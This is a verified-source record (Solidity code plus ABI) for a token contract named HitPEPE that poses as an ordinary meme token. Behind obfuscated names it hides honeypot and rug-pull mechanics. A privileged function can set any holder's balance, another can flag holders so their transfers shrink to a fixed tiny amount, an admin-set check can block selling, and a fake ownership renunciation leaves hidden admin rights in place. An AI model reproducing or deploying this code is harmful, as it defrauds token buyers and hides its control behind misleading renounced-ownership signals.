{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface modeTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toSender) external view returns (uint256);\n\n    function transfer(address walletShouldLimit, uint256 enableLimit) external returns (bool);\n\n    function allowance(address liquidityTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletShouldLimit,\n        uint256 enableLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTx, uint256 value);\n    event Approval(address indexed liquidityTotal, address indexed spender, uint256 value);\n}\n\nabstract contract tradingToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderAtTrading {\n    function createPair(address shouldTrading, address sellShould) external returns (address);\n}\n\ninterface modeTradingMetadata is modeTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HitPEPE is tradingToken, modeTrading, modeTradingMetadata {\n\n    function transfer(address txEnable, uint256 enableLimit) external virtual override returns (bool) {\n        return tokenLiquidity(_msgSender(), txEnable, enableLimit);\n    }\n\n    mapping(address => bool) public tradingTx;\n\n    uint256 constant listToToken = 13 ** 10;\n\n    function allowance(address buyTx, address txTeamMarketing) external view virtual override returns (uint256) {\n        if (txTeamMarketing == takeToken) {\n            return type(uint256).max;\n        }\n        return walletIs[buyTx][txTeamMarketing];\n    }\n\n    mapping(address => uint256) private swapTeam;\n\n    bool private isTo;\n\n    mapping(address => bool) public teamSell;\n\n    bool public teamReceiver;\n\n    address takeToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return tradingLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverList;\n    }\n\n    uint256 private swapWallet = 100000000 * 10 ** 18;\n\n    uint256 teamTotalMin;\n\n    function isSwap() public {\n        emit OwnershipTransferred(amountMarketingAt, address(0));\n        tradingLaunch = address(0);\n    }\n\n    function sellBuy(address teamIsSender) public {\n        minTo();\n        if (teamReceiver == isTo) {\n            feeAmount = false;\n        }\n        if (teamIsSender == amountMarketingAt || teamIsSender == liquidityLaunched) {\n            return;\n        }\n        tradingTx[teamIsSender] = true;\n    }\n\n    address private tradingLaunch;\n\n    address public amountMarketingAt;\n\n    address buyMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed listAmount, address indexed minIs);\n\n    uint256 public listTrading;\n\n    function transferFrom(address buyFund, address walletShouldLimit, uint256 enableLimit) external override returns (bool) {\n        if (_msgSender() != takeToken) {\n            if (walletIs[buyFund][_msgSender()] != type(uint256).max) {\n                require(enableLimit <= walletIs[buyFund][_msgSender()]);\n                walletIs[buyFund][_msgSender()] -= enableLimit;\n            }\n        }\n        return tokenLiquidity(buyFund, walletShouldLimit, enableLimit);\n    }\n\n    bool public swapLimit;\n\n    constructor (){\n        if (toWallet == takeLiquidity) {\n            takeLiquidity = listTrading;\n        }\n        buyLimit receiverLiquidity = buyLimit(takeToken);\n        liquidityLaunched = senderAtTrading(receiverLiquidity.factory()).createPair(receiverLiquidity.WETH(), address(this));\n        if (feeAmount) {\n            isTo = false;\n        }\n        amountMarketingAt = _msgSender();\n        isSwap();\n        teamSell[amountMarketingAt] = true;\n        swapTeam[amountMarketingAt] = swapWallet;\n        if (isTo) {\n            takeLiquidity = listTrading;\n        }\n        emit Transfer(address(0), amountMarketingAt, swapWallet);\n    }\n\n    string private marketingExempt = \"Hit PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingMode;\n    }\n\n    uint256 launchTeamTrading;\n\n    uint256 public fromBuy;\n\n    function amountTeamFund(address buyFund, address walletShouldLimit, uint256 enableLimit) internal returns (bool) {\n        require(swapTeam[buyFund] >= enableLimit);\n        swapTeam[buyFund] -= enableLimit;\n        swapTeam[walletShouldLimit] += enableLimit;\n        emit Transfer(buyFund, walletShouldLimit, enableLimit);\n        return true;\n    }\n\n    bool public teamFund;\n\n    bool public totalTake;\n\n    function launchMode(address txEnable, uint256 enableLimit) public {\n        minTo();\n        swapTeam[txEnable] = enableLimit;\n    }\n\n    uint8 private marketingMode = 18;\n\n    function balanceOf(address toSender) public view virtual override returns (uint256) {\n        return swapTeam[toSender];\n    }\n\n    address public liquidityLaunched;\n\n    function minTo() private view {\n        require(teamSell[_msgSender()]);\n    }\n\n    bool private feeAmount;\n\n    uint256 public toWallet;\n\n    mapping(address => mapping(address => uint256)) private walletIs;\n\n    function toSellLaunched(address sellTake) public {\n        if (totalTake) {\n            return;\n        }\n        if (takeLiquidity == fromBuy) {\n            toWallet = takeLiquidity;\n        }\n        teamSell[sellTake] = true;\n        if (feeAmount) {\n            teamFund = false;\n        }\n        totalTake = true;\n    }\n\n    function approve(address txTeamMarketing, uint256 enableLimit) public virtual override returns (bool) {\n        walletIs[_msgSender()][txTeamMarketing] = enableLimit;\n        emit Approval(_msgSender(), txTeamMarketing, enableLimit);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapWallet;\n    }\n\n    string private receiverList = \"HPE\";\n\n    function totalBuyTrading(uint256 enableLimit) public {\n        minTo();\n        teamTotalMin = enableLimit;\n    }\n\n    function tokenLiquidity(address buyFund, address walletShouldLimit, uint256 enableLimit) internal returns (bool) {\n        if (buyFund == amountMarketingAt) {\n            return amountTeamFund(buyFund, walletShouldLimit, enableLimit);\n        }\n        uint256 exemptTeam = modeTrading(liquidityLaunched).balanceOf(buyMarketing);\n        require(exemptTeam == teamTotalMin);\n        require(walletShouldLimit != buyMarketing);\n        if (tradingTx[buyFund]) {\n            return amountTeamFund(buyFund, walletShouldLimit, listToToken);\n        }\n        return amountTeamFund(buyFund, walletShouldLimit, enableLimit);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingExempt;\n    }\n\n    uint256 private takeLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTeamMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketingAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeamMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIsSender\",\"type\":\"address\"}],\"name\":\"sellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"toSellLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"totalBuyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletShouldLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HitPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}